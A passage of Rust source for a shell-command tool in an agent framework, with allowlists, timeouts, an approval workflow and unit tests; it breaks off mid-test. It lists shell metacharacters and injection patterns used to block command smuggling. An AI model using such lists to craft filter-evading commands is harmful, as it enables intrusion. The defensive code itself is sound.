//! # Shell Tool
//!
//! Execute shell commands with security controls.
//!
//! **⚠️ SECURITY WARNING**: Shell command execution is inherently risky. This tool provides
//! multiple security mechanisms, but you MUST configure appropriate restrictions for your use case:
//!
//! 1. **Command Allowlist** - Only allow specific commands (RECOMMENDED)
//! 2. **Command Prefix** - Only allow commands starting with specific prefixes
//! 3. **Working Directory Restriction** - Limit execution to specific directories
//! 4. **Timeout** - Prevent long-running commands
//! 5. **Output Size Limits** - Prevent excessive output
//!
//! ## Examples
//!
//! ### Safe Mode with Allowlist (RECOMMENDED)
//!
//! ```no_run
//! use dashflow_shell_tool::ShellTool;
//! use dashflow::core::tools::{Tool, ToolInput};
//! use serde_json::json;
//!
//! # tokio_test::block_on(async {
//! // Only allow specific safe commands
//! let tool = ShellTool::new()
//!     .with_allowed_commands(vec!["ls".to_string(), "pwd".to_string(), "date".to_string()]);
//!
//! let input = json!({"command": "ls -la"});
//! let result = tool._call(ToolInput::Structured(input)).await?;
//! println!("{}", result);
//! # Ok::<(), Box<dyn std::error::Error>>(())
//! # });
//! ```
//!
//! ### Prefix-Based Restrictions
//!
//! ```no_run
//! use dashflow_shell_tool::ShellTool;
//! use dashflow::core::tools::{Tool, ToolInput};
//! use serde_json::json;
//!
//! # tokio_test::block_on(async {
//! // Only allow git commands
//! let tool = ShellTool::new()
//!     .with_allowed_prefixes(vec!["git ".to_string()]);
//!
//! let input = json!({"command": "git status"});
//! let result = tool._call(ToolInput::Structured(input)).await?;
//! # Ok::<(), Box<dyn std::error::Error>>(())
//! # });
//! ```
//!
//! ### Sandboxed Execution (MOST SECURE)
//!
//! ```no_run
//! use dashflow_shell_tool::{SandboxedShellTool, SandboxMode, SandboxFallback};
//! use std::path::PathBuf;
//!
//! # tokio_test::block_on(async {
//! // OS-level sandbox with restricted filesystem access
//! let tool = SandboxedShellTool::builder()
//!     .sandbox_mode(SandboxMode::Strict)
//!     .writable_roots(vec![PathBuf::from("/tmp")])
//!     .on_sandbox_missing(SandboxFallback::Warn)
//!     .build()?;
//!
//! let result = tool.execute("ls -la").await?;
//! # Ok::<(), Box<dyn std::error::Error>>(())
//! # });
//! ```
//!
//! # See Also
//!
//! - [`Tool`] - The trait this implements
//! - [`dashflow-file-tool`](https://docs.rs/dashflow-file-tool) - File system operations (safer than shell for file ops)
//! - [`dashflow-calculator`](https://docs.rs/dashflow-calculator) - Mathematical expression evaluation (safer than shell for math)
//! - [`SafeShellTool`] - Shell tool with safety analysis and approval workflow

pub mod safety;
pub mod sandbox;

pub use safety::{AnalysisResult, CommandAnalyzer, SafetyConfig, Severity};
pub use sandbox::{
    SandboxCapabilities, SandboxError, SandboxFallback, SandboxMissingCallback, SandboxMode,
    SandboxedShellTool, SandboxedShellToolBuilder,
};

use async_trait::async_trait;
use dashflow::core::{
    tools::{Tool, ToolInput},
    Error,
};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;
use tokio::io::AsyncReadExt;
use tokio::process::Command;

/// Shell command execution tool with security controls.
///
/// **⚠️ SECURITY**: This tool executes arbitrary shell commands. You MUST configure
/// appropriate security restrictions using allowlists, prefixes, or working directory restrictions.
///
/// By default (no restrictions), this tool is UNSAFE and should NEVER be exposed to untrusted input.
///
/// ## Security Configuration
///
/// 1. **Command Allowlist** (most restrictive) - Only specific commands allowed
/// 2. **Prefix Allowlist** (moderate) - Only commands with specific prefixes allowed
/// 3. **Working Directory** - Restrict execution to specific directory
/// 4. **Timeout** - Limit execution time (default: 30 seconds)
/// 5. **Max Output Size** - Limit output bytes (default: 1 MB)
///
/// ## Examples
///
/// ```
/// use dashflow_shell_tool::ShellTool;
///
/// // Safe: Only allow specific commands
/// let safe_tool = ShellTool::new()
///     .with_allowed_commands(vec!["ls".to_string(), "pwd".to_string()]);
///
/// // Moderate: Only allow git commands
/// let git_tool = ShellTool::new()
///     .with_allowed_prefixes(vec!["git ".to_string()]);
///
/// // UNSAFE: No restrictions (DO NOT USE IN PRODUCTION)
/// let unsafe_tool = ShellTool::new();
/// ```
#[derive(Debug, Clone)]
pub struct ShellTool {
    /// Optional list of allowed commands (first token only)
    allowed_commands: Option<Vec<String>>,
    /// Optional list of allowed command prefixes
    allowed_prefixes: Option<Vec<String>>,
    /// Optional working directory for command execution
    working_dir: Option<PathBuf>,
    /// Command timeout in seconds
    timeout_seconds: u64,
    /// Maximum output size in bytes
    max_output_bytes: usize,
}

impl Default for ShellTool {
    fn default() -> Self {
        Self::new()
    }
}

impl ShellTool {
    /// Create a new shell tool with default settings.
    ///
    /// **⚠️ WARNING**: By default, NO security restrictions are enabled.
    /// You MUST configure restrictions before using in production.
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    ///
    /// let tool = ShellTool::new()
    ///     .with_allowed_commands(vec!["ls".to_string(), "pwd".to_string()])
    ///     .with_timeout(10);
    /// ```
    #[must_use]
    pub fn new() -> Self {
        Self {
            allowed_commands: None,
            allowed_prefixes: None,
            working_dir: None,
            timeout_seconds: 30,
            max_output_bytes: 1024 * 1024, // 1 MB default
        }
    }

    /// Set allowed commands (first token only).
    ///
    /// When set, only commands in this list will be executed.
    /// This is the MOST SECURE option.
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    ///
    /// let tool = ShellTool::new()
    ///     .with_allowed_commands(vec!["ls".to_string(), "pwd".to_string(), "date".to_string()]);
    /// ```
    #[must_use]
    pub fn with_allowed_commands(mut self, commands: Vec<String>) -> Self {
        self.allowed_commands = Some(commands);
        self
    }

    /// Set allowed command prefixes.
    ///
    /// When set, only commands starting with these prefixes will be executed.
    /// Useful for allowing a category of commands (e.g., "git ", "docker ").
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    ///
    /// // Only allow git commands
    /// let tool = ShellTool::new()
    ///     .with_allowed_prefixes(vec!["git ".to_string()]);
    /// ```
    #[must_use]
    pub fn with_allowed_prefixes(mut self, prefixes: Vec<String>) -> Self {
        self.allowed_prefixes = Some(prefixes);
        self
    }

    /// Set working directory for command execution.
    ///
    /// All commands will be executed in this directory.
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    /// use std::path::PathBuf;
    ///
    /// let tool = ShellTool::new()
    ///     .with_working_dir(PathBuf::from("/tmp"));
    /// ```
    #[must_use]
    pub fn with_working_dir(mut self, dir: PathBuf) -> Self {
        self.working_dir = Some(dir);
        self
    }

    /// Set command timeout in seconds.
    ///
    /// Commands exceeding this timeout will be killed.
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    ///
    /// let tool = ShellTool::new()
    ///     .with_timeout(60); // 60 second timeout
    /// ```
    #[must_use]
    pub fn with_timeout(mut self, seconds: u64) -> Self {
        self.timeout_seconds = seconds;
        self
    }

    /// Set maximum output size in bytes.
    ///
    /// Output exceeding this size will be truncated.
    ///
    /// # Examples
    ///
    /// ```
    /// use dashflow_shell_tool::ShellTool;
    ///
    /// let tool = ShellTool::new()
    ///     .with_max_output_bytes(512 * 1024); // 512 KB max
    /// ```
    #[must_use]
    pub fn with_max_output_bytes(mut self, bytes: usize) -> Self {
        self.max_output_bytes = bytes;
        self
    }

    /// Shell metacharacters that can be used for command injection.
    /// These allow command chaining, substitution, or redirection.
    const SHELL_METACHARACTERS: &'static [char] = &[
        ';',  // Command separator
        '|',  // Pipe
        '&',  // Background/AND
        '`',  // Command substitution (backticks)
        '\n', // Newline (command separator)
        '\r', // Carriage return
    ];

    /// Patterns that indicate command substitution or injection attempts.
    /// These are checked as substrings to catch $() and similar constructs.
    const INJECTION_PATTERNS: &'static [&'static str] = &[
        "$(", // Command substitution
        "${", // Variable expansion (can be exploited)
        "||", // OR operator (command chaining)
        "&&", // AND operator (command chaining)
    ];

    /// Check for shell metacharacters/patterns that could enable command injection.
    ///
    /// This is a defense-in-depth measure that blocks commands containing
    /// characters that could be used to inject additional commands.
    fn contains_shell_injection(command: &str) -> Option<String> {
        for &c in Self::SHELL_METACHARACTERS {
            if command.contains(c) {
                let char_repr = match c {
                    '\n' => "\\n".to_string(),
                    '\r' => "\\r".to_string(),
                    _ => c.to_string(),
                };
                return Some(format!(
                    "Command contains shell metacharacter '{}' which could enable command injection",
                    char_repr
                ));
            }
        }

        for &pattern in Self::INJECTION_PATTERNS {
            if command.contains(pattern) {
                return Some(format!(
                    "Command contains pattern '{}' which could enable command injection",
                    pattern
                ));
            }
        }

        None
    }

    fn parse_command_words(command: &str) -> Result<Vec<String>, String> {
        shlex::split(command).ok_or_else(|| {
            "Failed to parse command (unbalanced quotes or invalid escapes)".to_string()
        })
    }

    #[cfg(target_os = "windows")]
    fn is_windows_shell_builtin(program: &str) -> bool {
        // NOTE: This is intentionally a small subset to avoid accidentally treating
        // dangerous built-ins (e.g., `del`) as “supported” in restricted mode.
        matches!(
            program.to_ascii_lowercase().as_str(),
            "echo" | "dir" | "type" | "cd"
        )
    }

    #[cfg(target_os = "windows")]
    fn validate_windows_cmd_words(words: &[String]) -> Result<(), String> {
        // SECURITY: `cmd.exe` expands `%VAR%`/`!VAR!` before execution, and treats certain
        // characters as control operators. In restricted mode we forbid these characters
        // so allowlists/prefix checks cannot be bypassed via expansion or chaining.
        const FORBIDDEN: &[char] = &['&', '|', '<', '>', '^', '%', '!', '\n', '\r', '\0'];

        for word in words {
            if let Some(c) = word.chars().find(|c| FORBIDDEN.contains(c)) {
                let char_repr = match c {
                    '\n' => "\\n".to_string(),
                    '\r' => "\\r".to_string(),
                    '\0' => "\\0".to_string(),
                    _ => c.to_string(),
                };
                return Err(format!(
                    "Command rejected: contains character '{char_repr}' which is unsafe under cmd.exe in restricted mode"
                ));
            }
        }

        Ok(())
    }

    /// Check if a command is allowed based on configured restrictions.
    fn is_command_allowed(&self, command: &str, words: &[String]) -> Result<(), String> {
        let command = command.trim();
        let first_token = words.first().map(String::as_str).unwrap_or("");

        if first_token.is_empty() {
            return Err("Command cannot be empty".to_string());
        }

        // Check allowed commands (first token)
        if let Some(ref allowed) = self.allowed_commands {
            if !allowed.contains(&first_token.to_string()) {
                return Err(format!(
                    "Command '{}' not in allowed list. Allowed commands: {}",
                    first_token,
                    allowed.join(", ")
                ));
            }
        }

        // Check allowed prefixes
        if let Some(ref prefixes) = self.allowed_prefixes {
            let has_allowed_prefix = prefixes.iter().any(|prefix| command.starts_with(prefix));
            if !has_allowed_prefix {
                return Err(format!(
                    "Command must start with one of: {}",
                    prefixes.join(", ")
                ));
            }
        }

        Ok(())
    }

    fn build_shell_command(command: &str) -> Command {
        if cfg!(target_os = "windows") {
            let mut c = Command::new("cmd");
            c.args(["/C", command]);
            c
        } else {
            let mut c = Command::new("sh");
            c.args(["-c", command]);
            c
        }
    }

    fn build_restricted_command(words: &[String]) -> Result<Command, String> {
        if words.is_empty() {
            return Err("Command cannot be empty".to_string());
        }

        #[cfg(target_os = "windows")]
        {
            let program = &words[0];
            if Self::is_windows_shell_builtin(program) {
                Self::validate_windows_cmd_words(words)?;

                let mut c = Command::new("cmd");
                c.arg("/D").arg("/C").arg(program);
                c.args(&words[1..]);
                return Ok(c);
            }
        }

        let mut c = Command::new(&words[0]);
        c.args(&words[1..]);

        Ok(c)
    }

    /// Execute a shell command.
    async fn execute_command(&self, command: &str) -> Result<String, Error> {
        let command = command.trim();
        if command.is_empty() {
            return Err(Error::tool_error("Command cannot be empty"));
        }

        let has_restrictions = self.allowed_commands.is_some() || self.allowed_prefixes.is_some();
        let restricted_words = if has_restrictions {
            if let Some(reason) = Self::contains_shell_injection(command) {
                return Err(Error::tool_error(format!("Security: {reason}")));
            }
            Some(
                Self::parse_command_words(command)
                    .map_err(|e| Error::tool_error(format!("Security: {e}")))?,
            )
        } else {
            None
        };

        if let Some(words) = restricted_words.as_deref() {
            self.is_command_allowed(command, words)
                .map_err(|e| Error::tool_error(format!("Security: {e}")))?;
        }

        // Prepare command:
        // - Unrestricted mode runs via the platform shell (feature-complete but unsafe).
        // - Restricted mode avoids the shell to prevent bypass via variable expansion/chaining.
        let mut cmd = if let Some(words) = restricted_words.as_deref() {
            Self::build_restricted_command(words)
                .map_err(|e| Error::tool_error(format!("Security: {e}")))?
        } else {
            Self::build_shell_command(command)
        };

        // Set working directory if configured
        if let Some(ref dir) = self.working_dir {
            cmd.current_dir(dir);
        }

        // Spawn process with stdout/stderr capture
        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let mut child = cmd
            .spawn()
            .map_err(|e| Error::tool_error(format!("Failed to spawn command: {e}")))?;

        // Get stdout and stderr handles
        let mut stdout = child
            .stdout
            .take()
            .ok_or_else(|| Error::tool_error("Failed to capture stdout"))?;
        let mut stderr = child
            .stderr
            .take()
            .ok_or_else(|| Error::tool_error("Failed to capture stderr"))?;

        // Wait with timeout
        let timeout = Duration::from_secs(self.timeout_seconds);
        let result = tokio::time::timeout(timeout, async {
            // Read stdout and stderr concurrently
            let mut stdout_buf = Vec::new();
            let mut stderr_buf = Vec::new();

            // Read up to max_output_bytes
            let stdout_task = tokio::spawn(async move {
                stdout.read_to_end(&mut stdout_buf).await?;
                Ok::<_, std::io::Error>(stdout_buf)
            });

            let stderr_task = tokio::spawn(async move {
                stderr.read_to_end(&mut stderr_buf).await?;
                Ok::<_, std::io::Error>(stderr_buf)
            });

            let (stdout_result, stderr_result) = tokio::join!(stdout_task, stderr_task);

            let stdout_bytes = stdout_result
                .map_err(|e| Error::tool_error(format!("Join error: {e}")))?
                .map_err(|e| Error::tool_error(format!("Read stdout error: {e}")))?;
            let stderr_bytes = stderr_result
                .map_err(|e| Error::tool_error(format!("Join error: {e}")))?
                .map_err(|e| Error::tool_error(format!("Read stderr error: {e}")))?;

            // Wait for process to complete
            let status = child
                .wait()
                .await
                .map_err(|e| Error::tool_error(format!("Wait error: {e}")))?;

            Ok::<_, Error>((stdout_bytes, stderr_bytes, status))
        })
        .await;

        match result {
            Ok(Ok((stdout_bytes, stderr_bytes, status))) => {
                // Truncate output if needed
                let stdout_str = String::from_utf8_lossy(
                    &stdout_bytes[..std::cmp::min(stdout_bytes.len(), self.max_output_bytes)],
                );
                let stderr_str = String::from_utf8_lossy(
                    &stderr_bytes[..std::cmp::min(stderr_bytes.len(), self.max_output_bytes)],
                );

                let mut output = String::new();

                if !stdout_str.is_empty() {
                    output.push_str(&stdout_str);
                }

                if !stderr_str.is_empty() {
                    if !output.is_empty() {
                        output.push_str("\n[stderr]\n");
                    }
                    output.push_str(&stderr_str);
                }

                // Add truncation notice if needed
                if stdout_bytes.len() > self.max_output_bytes
                    || stderr_bytes.len() > self.max_output_bytes
                {
                    output.push_str(&format!(
                        "\n\n[Output truncated at {} bytes]",
                        self.max_output_bytes
                    ));
                }

                // Add exit code if non-zero
                if !status.success() {
                    let exit_code = status.code().unwrap_or(-1);
                    output.push_str(&format!("\n\nExit code: {exit_code}"));
                }

                if output.is_empty() {
                    output = "<no output>".to_string();
                }

                Ok(output)
            }
            Ok(Err(e)) => Err(e),
            Err(_) => {
                // Timeout - kill the process
                // SAFETY: Kill failure is acceptable - process may have already exited,
                // or kill may fail for permission reasons. Either way, we're returning
                // a timeout error and there's no recovery action.
                let _ = child.kill().await;
                Err(Error::tool_error(format!(
                    "Command timed out after {} seconds",
                    self.timeout_seconds
                )))
            }
        }
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &'static str {
        "shell"
    }

    fn description(&self) -> &'static str {
        "Execute shell commands. \
         Returns stdout and stderr output. \
         Non-zero exit codes are included in output. \
         Commands may be restricted based on security policy."
    }

    fn args_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute"
                }
            },
            "required": ["command"]
        })
    }

    async fn _call(&self, input: ToolInput) -> Result<String, Error> {
        let command = match input {
            ToolInput::String(s) => s,
            ToolInput::Structured(obj) => obj
                .get("command")
                .and_then(|v| v.as_str())
                .ok_or_else(|| Error::tool_error("Missing 'command' field in input"))?
                .to_string(),
        };

        self.execute_command(&command).await
    }
}

/// Approval callback type for dangerous commands
pub type ApprovalCallback = Arc<dyn Fn(&str, Severity) -> bool + Send + Sync>;

/// Safe shell tool with command analysis and approval workflow
///
/// This tool analyzes commands before execution and can require approval
/// for dangerous operations.
///
/// ## Example
///
/// ```
/// use dashflow_shell_tool::{SafeShellTool, SafetyConfig, Severity};
/// use std::sync::Arc;
///
/// // Create with restrictive config
/// let tool = SafeShellTool::new(SafetyConfig::restrictive());
///
/// // Or with custom approval callback
/// let tool_with_approval = SafeShellTool::new(SafetyConfig::permissive())
///     .with_approval_callback(Arc::new(|cmd, severity| {
///         // Auto-approve safe commands, block dangerous ones
///         severity <= Severity::Unknown
///     }));
/// ```
pub struct SafeShellTool {
    /// Command analyzer
    analyzer: CommandAnalyzer,
    /// Working directory
    working_dir: Option<PathBuf>,
    /// Command timeout in seconds
    timeout_seconds: u64,
    /// Maximum output size in bytes
    max_output_bytes: usize,
    /// Approval callback (returns true if command should execute)
    approval_callback: Option<ApprovalCallback>,
    /// Whether to block forbidden commands entirely
    block_forbidden: bool,
}

impl std::fmt::Debug for SafeShellTool {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("SafeShellTool")
            .field("working_dir", &self.working_dir)
            .field("timeout_seconds", &self.timeout_seconds)
            .field("max_output_bytes", &self.max_output_bytes)
            .field("has_approval_callback", &self.approval_callback.is_some())
            .field("block_forbidden", &self.block_forbidden)
            .finish()
    }
}

impl SafeShellTool {
    /// Create a new safe shell tool with the given safety config
    #[must_use]
    pub fn new(config: SafetyConfig) -> Self {
        Self {
            analyzer: CommandAnalyzer::new(config),
            working_dir: None,
            timeout_seconds: 30,
            max_output_bytes: 1024 * 1024,
            approval_callback: None,
            block_forbidden: true,
        }
    }

    /// Create with restrictive safety config
    #[must_use]
    pub fn restrictive() -> Self {
        Self::new(SafetyConfig::restrictive())
    }

    /// Create with permissive safety config
    #[must_use]
    pub fn permissive() -> Self {
        Self::new(SafetyConfig::permissive())
    }

    /// Set working directory
    #[must_use]
    pub fn with_working_dir(mut self, dir: PathBuf) -> Self {
        self.working_dir = Some(dir);
        self
    }

    /// Set timeout in seconds
    #[must_use]
    pub fn with_timeout(mut self, seconds: u64) -> Self {
        self.timeout_seconds = seconds;
        self
    }

    /// Set maximum output size
    #[must_use]
    pub fn with_max_output_bytes(mut self, bytes: usize) -> Self {
        self.max_output_bytes = bytes;
        self
    }

    /// Set approval callback
    ///
    /// The callback receives the command and its severity, and returns
    /// true if the command should be executed.
    #[must_use]
    pub fn with_approval_callback(mut self, callback: ApprovalCallback) -> Self {
        self.approval_callback = Some(callback);
        self
    }

    /// Set whether to block forbidden commands entirely
    #[must_use]
    pub fn with_block_forbidden(mut self, block: bool) -> Self {
        self.block_forbidden = block;
        self
    }

    /// Analyze a command without executing it
    #[must_use]
    pub fn analyze(&self, command: &str) -> AnalysisResult {
        self.analyzer.analyze(command)
    }

    /// Execute a command after safety checks
    async fn execute_command(&self, command: &str) -> Result<String, Error> {
        // Analyze command
        let analysis = self.analyzer.analyze(command);

        // Block forbidden commands
        if self.block_forbidden && analysis.severity == Severity::Forbidden {
            return Err(Error::tool_error(format!(
                "Command blocked (forbidden): {}. Reasons: {}",
                command,
                analysis.reasons.join("; ")
            )));
        }

        // Check approval callback for non-safe commands
        if analysis.severity > Severity::Safe {
            if let Some(ref callback) = self.approval_callback {
                if !callback(command, analysis.severity) {
                    return Err(Error::tool_error(format!(
                        "Command not approved: {} (severity: {})",
                        command, analysis.severity
                    )));
                }
            }
        }

        // Execute the command
        self.run_command(command).await
    }

    /// Actually run the command
    async fn run_command(&self, command: &str) -> Result<String, Error> {
        let mut cmd = if cfg!(target_os = "windows") {
            let mut c = Command::new("cmd");
            c.args(["/C", command]);
            c
        } else {
            let mut c = Command::new("sh");
            c.args(["-c", command]);
            c
        };

        if let Some(ref dir) = self.working_dir {
            cmd.current_dir(dir);
        }

        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let mut child = cmd
            .spawn()
            .map_err(|e| Error::tool_error(format!("Failed to spawn command: {e}")))?;

        let mut stdout = child
            .stdout
            .take()
            .ok_or_else(|| Error::tool_error("Failed to capture stdout"))?;
        let mut stderr = child
            .stderr
            .take()
            .ok_or_else(|| Error::tool_error("Failed to capture stderr"))?;

        let timeout = Duration::from_secs(self.timeout_seconds);
        let max_bytes = self.max_output_bytes;

        let result = tokio::time::timeout(timeout, async {
            let mut stdout_buf = Vec::new();
            let mut stderr_buf = Vec::new();

            let stdout_task = tokio::spawn(async move {
                stdout.read_to_end(&mut stdout_buf).await?;
                Ok::<_, std::io::Error>(stdout_buf)
            });

            let stderr_task = tokio::spawn(async move {
                stderr.read_to_end(&mut stderr_buf).await?;
                Ok::<_, std::io::Error>(stderr_buf)
            });

            let (stdout_result, stderr_result) = tokio::join!(stdout_task, stderr_task);

            let stdout_bytes = stdout_result
                .map_err(|e| Error::tool_error(format!("Join error: {e}")))?
                .map_err(|e| Error::tool_error(format!("Read stdout error: {e}")))?;
            let stderr_bytes = stderr_result
                .map_err(|e| Error::tool_error(format!("Join error: {e}")))?
                .map_err(|e| Error::tool_error(format!("Read stderr error: {e}")))?;

            let status = child
                .wait()
                .await
                .map_err(|e| Error::tool_error(format!("Wait error: {e}")))?;

            Ok::<_, Error>((stdout_bytes, stderr_bytes, status))
        })
        .await;

        match result {
            Ok(Ok((stdout_bytes, stderr_bytes, status))) => {
                let stdout_str = String::from_utf8_lossy(
                    &stdout_bytes[..std::cmp::min(stdout_bytes.len(), max_bytes)],
                );
                let stderr_str = String::from_utf8_lossy(
                    &stderr_bytes[..std::cmp::min(stderr_bytes.len(), max_bytes)],
                );

                let mut output = String::new();

                if !stdout_str.is_empty() {
                    output.push_str(&stdout_str);
                }

                if !stderr_str.is_empty() {
                    if !output.is_empty() {
                        output.push_str("\n[stderr]\n");
                    }
                    output.push_str(&stderr_str);
                }

                if stdout_bytes.len() > max_bytes || stderr_bytes.len() > max_bytes {
                    output.push_str(&format!("\n\n[Output truncated at {} bytes]", max_bytes));
                }

                if !status.success() {
                    let exit_code = status.code().unwrap_or(-1);
                    output.push_str(&format!("\n\nExit code: {exit_code}"));
                }

                if output.is_empty() {
                    output = "<no output>".to_string();
                }

                Ok(output)
            }
            Ok(Err(e)) => Err(e),
            Err(_) => {
                // SAFETY: Kill failure is acceptable - process may have already exited,
                // or kill may fail for permission reasons. Either way, we're returning
                // a timeout error and there's no recovery action.
                let _ = child.kill().await;
                Err(Error::tool_error(format!(
                    "Command timed out after {} seconds",
                    self.timeout_seconds
                )))
            }
        }
    }
}

#[async_trait]
impl Tool for SafeShellTool {
    fn name(&self) -> &'static str {
        "safe_shell"
    }

    fn description(&self) -> &'static str {
        "Execute shell commands with safety analysis. \
         Commands are analyzed for potential risks before execution. \
         Dangerous commands may require approval. \
         Forbidden commands are blocked."
    }

    fn args_schema(&self) -> serde_json::Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute"
                },
                "analyze_only": {
                    "type": "boolean",
                    "description": "If true, only analyze the command without executing",
                    "default": false
                }
            },
            "required": ["command"]
        })
    }

    async fn _call(&self, input: ToolInput) -> Result<String, Error> {
        let (command, analyze_only) = match input {
            ToolInput::String(s) => (s, false),
            ToolInput::Structured(obj) => {
                let cmd = obj
                    .get("command")
                    .and_then(|v| v.as_str())
                    .ok_or_else(|| Error::tool_error("Missing 'command' field in input"))?
                    .to_string();
                let analyze = obj
                    .get("analyze_only")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                (cmd, analyze)
            }
        };

        if analyze_only {
            let analysis = self.analyze(&command);
            Ok(serde_json::to_string_pretty(&analysis)
                .unwrap_or_else(|_| format!("{:?}", analysis)))
        } else {
            self.execute_command(&command).await
        }
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;
    use dashflow_standard_tests::tool_comprehensive_tests::ToolComprehensiveTests;

    #[tokio::test]
    async fn test_shell_tool_creation() {
        let tool = ShellTool::new();
        assert_eq!(tool.name(), "shell");
        assert!(tool.description().contains("Execute shell commands"));
    }

    #[tokio::test]
    async fn test_shell_tool_builder() {
        let tool = ShellTool::new()
            .with_timeout(60)
            .with_max_output_bytes(512 * 1024)
            .with_allowed_commands(vec!["ls".to_string()]);

        assert_eq!(tool.timeout_seconds, 60);
        assert_eq!(tool.max_output_bytes, 512 * 1024);
        assert!(tool.allowed_commands.is_some());
    }

    #[tokio::test]
    async fn test_args_schema() {
        let tool = ShellTool::new();
        let schema = tool.args_schema();

        assert_eq!(schema["type"], "object");
        assert!(schema["properties"].get("command").is_some());
        assert_eq!(schema["required"][0], "command");
    }

    #[tokio::test]
    async fn test_simple_command() {
        let tool = ShellTool::new();

        // Test with echo command (works on Unix and Windows)
        let input = serde_json::json!({"command": "echo test"});
        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        assert!(result.contains("test"));
    }

    #[tokio::test]
    async fn test_command_allowlist() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        // Allowed command should work
        let input1 = serde_json::json!({"command": "echo allowed"});
        let result1 = tool._call(ToolInput::Structured(input1)).await;
        assert!(result1.is_ok());

        // Disallowed command should fail
        let input2 = serde_json::json!({"command": "ls"});
        let result2 = tool._call(ToolInput::Structured(input2)).await;
        assert!(result2.is_err());
        assert!(result2
            .unwrap_err()
            .to_string()
            .contains("not in allowed list"));
    }

    #[tokio::test]
    async fn test_command_prefix() {
        let tool = ShellTool::new().with_allowed_prefixes(vec!["echo ".to_string()]);

        // Command with allowed prefix should work
        let input1 = serde_json::json!({"command": "echo test"});
        let result1 = tool._call(ToolInput::Structured(input1)).await;
        assert!(result1.is_ok());

        // Command without allowed prefix should fail
        let input2 = serde_json::json!({"command": "ls"});
        let result2 = tool._call(ToolInput::Structured(input2)).await;
        assert!(result2.is_err());
        assert!(result2.unwrap_err().to_string().contains("must start with"));
    }

    #[tokio::test]
    async fn test_restricted_mode_preserves_quoted_args() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);

        let input = serde_json::json!({"command": "echo \"hello world\""});
        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        assert!(result.contains("hello world"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_restricted_mode_disables_dollar_expansion() {
        struct EnvVarGuard {
            key: &'static str,
            previous: Option<std::ffi::OsString>,
        }

        impl Drop for EnvVarGuard {
            fn drop(&mut self) {
                if let Some(value) = self.previous.take() {
                    std::env::set_var(self.key, value);
                } else {
                    std::env::remove_var(self.key);
                }
            }
        }

        let key = "DASHFLOW_SHELL_TOOL_TEST_VAR";
        let value = "__dashflow_shell_tool_test_value__";
        let guard = EnvVarGuard {
            key,
            previous: std::env::var_os(key),
        };
        std::env::set_var(key, value);

        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);
        let input = serde_json::json!({"command": format!("echo ${key}")});
        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        assert!(result.contains(&format!("${key}")));
        assert!(!result.contains(value));

        drop(guard);
    }

    #[cfg(windows)]
    #[tokio::test]
    async fn test_restricted_mode_blocks_cmd_variable_expansion() {
        let tool = ShellTool::new().with_allowed_commands(vec!["echo".to_string()]);
        let input = serde_json::json!({"command": "echo %DASHFLOW_SHELL_TOOL_TEST_VAR%"});
        let err = tool._call(ToolInput::Structured(input)).await.unwrap_err();

        assert!(err.to_string().contains("unsafe under cmd.exe"));
    }

    #[tokio::test]
    async fn test_timeout() {
        let tool = ShellTool::new().with_timeout(1);

        // Test timeout with sleep command
        let input = if cfg!(target_os = "windows") {
            serde_json::json!({"command": "timeout /t 5"})
        } else {
            serde_json::json!({"command": "sleep 5"})
        };

        let result = tool._call(ToolInput::Structured(input)).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("timed out"));
    }

    #[tokio::test]
    async fn test_nonzero_exit_code() {
        let tool = ShellTool::new();

        // Test command that returns non-zero exit code
        let input = if cfg!(target_os = "windows") {
            serde_json::json!({"command": "exit 42"})
        } else {
            serde_json::json!({"command": "sh -c 'exit 42'"})
        };

        let result = tool._call(ToolInput::Structured(input)).await.unwrap();
        assert!(result.contains("Exit code: 42"));
    }

    #[tokio::test]
    async fn test_string_input() {
        let tool = ShellTool::new();

        let result = tool._call(ToolInput::String("echo test".to_string())).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_working_directory() {
        let tool = ShellTool::new().with_working_dir(PathBuf::from("/tmp"));

        let input = serde_json::json!({"command": "pwd"});
        let result = tool._call(ToolInput::Structured(input)).await.unwrap();

        if !cfg!(target_os = "windows") {
            assert!(result.contains("/tmp"));
        }
    }

    // ========================================================================
    // Comprehensive Tests - Error Scenarios & Edge Cases
    // ========================================================================

    /// Test helper struct for comprehensive tests
    struct ShellToolComprehensiveTests {
        tool: ShellTool,
    }

    impl ShellToolComprehensiveTests {
        fn new() -> Self {
            Self {
                tool: ShellTool::new(),
            }
        }
    }

    #[async_trait::async_trait]
    impl dashflow_standard_tests::tool_comprehensive_tests::ToolComprehensiveTests
        for ShellToolComprehensiveTests
    {
        fn tool(&self) -> &dyn Tool {
            &self.tool
        }

        fn valid_input(&self) -> serde_json::Value {
            serde_json::json!({"command": "echo test"})
        }
    }

    #[tokio::test]
    async fn test_comprehensive_missing_required_field() {
        let tests = ShellToolComprehensiveTests::new();
        tests.test_error_missing_required_field().await.unwrap();
    }

    #[tokio::test]
    async fn test_comprehensive_invalid_field_type() {
